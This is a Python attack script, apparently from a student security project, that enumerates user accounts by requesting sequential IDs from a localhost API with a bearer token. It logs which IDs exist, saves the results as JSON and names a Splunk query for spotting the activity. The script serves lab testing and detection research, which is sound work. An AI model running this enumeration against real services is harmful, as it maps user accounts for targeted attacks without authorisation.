#!/usr/bin/env python3
"""
ATTACK 4: User Enumeration
OWASP: API1:2023
What: Probe sequential user IDs to map accounts
How: Try /user/1, /user/2, /user/3... 
Why dangerous: Reveals which user IDs exist
               Enables targeted attacks
"""
import requests
import time
import json
import datetime

TARGET = "http://localhost:8888"
RESULTS = "/home/xd-strange24/mscproject/experiments"

def run(token, count=30):
    print("=" * 55)
    print("ATTACK 4: USER ENUMERATION (API1:2023)")
    print("Probing Sequential User IDs")
    print("=" * 55)

    headers = {"Authorization": "Bearer " + token}
    found = []
    not_found = []

    print("[*] Probing user IDs 1 to " + str(count) + "...\n")

    for i in range(1, count + 1):
        endpoint = TARGET + "/identity/api/v2/user/" + str(i) + "/videos"
        try:
            r = requests.get(endpoint, headers=headers, timeout=5)
            if r.status_code == 200:
                found.append(i)
                print("[FOUND] User ID " + str(i) + " EXISTS")
            else:
                not_found.append(i)
                if i <= 5:
                    print("[  404] User ID " + str(i) + " not found")
            time.sleep(0.1)
        except Exception as e:
            print("[ERROR] " + str(e))

    print("\n[RESULT] " + str(len(found)) + " valid users found")
    print("[RESULT] " + str(len(not_found)) + " IDs returned 404")
    print("[RESULT] Pattern reveals API structure to attacker")
    print("[SEVERITY] HIGH")
    print("[SPLUNK] Check: index=api_logs user/ 404")

    result = {
        "attack": "User Enumeration",
        "owasp": "API1:2023",
        "timestamp": datetime.datetime.now().isoformat(),
        "ids_probed": count,
        "valid_ids_found": found,
        "not_found_count": len(not_found),
        "severity": "HIGH"
    }

    ts = datetime.datetime.now().strftime("%Y%m%d_%H%M%S")
    path = RESULTS + "/attack4_userenum_" + ts + ".json"
    with open(path, "w") as f:
        json.dump(result, f, indent=2)
    print("[SAVED] " + path)
    return result

if __name__ == "__main__":
    token = input("Enter Bearer token: ").strip()
    run(token)
